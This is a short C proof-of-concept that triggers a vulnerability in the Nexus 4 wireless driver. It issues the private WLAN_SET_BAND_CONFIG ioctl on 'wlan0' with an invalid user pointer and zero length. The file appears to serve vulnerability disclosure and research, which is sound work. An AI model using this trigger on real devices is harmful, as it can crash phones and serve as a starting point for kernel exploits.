/*
 * Copyright (C) 2016 by idhyt3r@gmail.com
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.


****************************************************************************
 trigger in:
    nexus 4 all version && security patch level 20161005
*/

#include <stdio.h>
#include <stdlib.h>

#include <sys/ioctl.h>
#include <sys/socket.h>

#include <errno.h>

#define IFNAMSIZ 16
#define SIOCIWFIRSTPRIV 0x8BE0

#define WLAN_SET_BAND_CONFIG  (SIOCIWFIRSTPRIV + 25)  /*Don't change this number*/

struct  iw_point
{
  void __user   *pointer;   /* Pointer to the data  (in user space) */
  __u16     length;     /* number of fields or size in bytes */
  __u16     flags;      /* Optional params */
};

union   iwreq_data
{
    /* Config - generic */
    char        name[IFNAMSIZ];
    /* Name : used to verify the presence of  wireless extensions.
     * Name of the protocol/provider... */
#if 0
    struct iw_point essid;      /* Extended network name */
    struct iw_param nwid;       /* network id (or domain - the cell) */
    struct iw_freq  freq;       /* frequency or channel :
                     * 0-1000 = channel
                     * > 1000 = frequency in Hz */

    struct iw_param sens;       /* signal level threshold */
    struct iw_param bitrate;    /* default bit rate */
    struct iw_param txpower;    /* default transmit power */
    struct iw_param rts;        /* RTS threshold threshold */
    struct iw_param frag;       /* Fragmentation threshold */
    __u32       mode;       /* Operation mode */
    struct iw_param retry;      /* Retry limits & lifetime */

    struct iw_point encoding;   /* Encoding stuff : tokens */
    struct iw_param power;      /* PM duration/timeout */
    struct iw_quality qual;     /* Quality part of statistics */

    struct sockaddr ap_addr;    /* Access point address */
    struct sockaddr addr;       /* Destination address (hw/mac) */

    struct iw_param param;      /* Other small parameters */
#endif

    struct iw_point data;       /* Other large parameters */
};


struct  iwreq 
{
    union
    {
        char    ifrn_name[IFNAMSIZ];    /* if name, e.g. "eth0" */
    } ifr_ifrn;

    /* Data part (defined just above) */
    union   iwreq_data  u;
};


void poc() 
{
    int fd, result, i;

    printf("[*] trigger...\n");

    errno = 0;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) 
    {
        printf("[-] socket error! %d: %s\n", errno, strerror(errno));
        exit(-1);
    }

    struct iwreq ifr = { 0 };
    strncpy(ifr.ifr_ifrn.ifrn_name, "wlan0", IFNAMSIZ);
    ifr.u.data.pointer = (char *)0x40404040;
    ifr.u.data.length = 0;

    errno = 0;
    result = ioctl(fd, WLAN_SET_BAND_CONFIG, &ifr);
    if (result < 0) 
    {
        printf("[-] ioctl error! %d: %s\n", errno, strerror(errno));
    }

    close(fd);
}

int main(int argc, char const *argv[])
{
    poc();
    return 0;
}

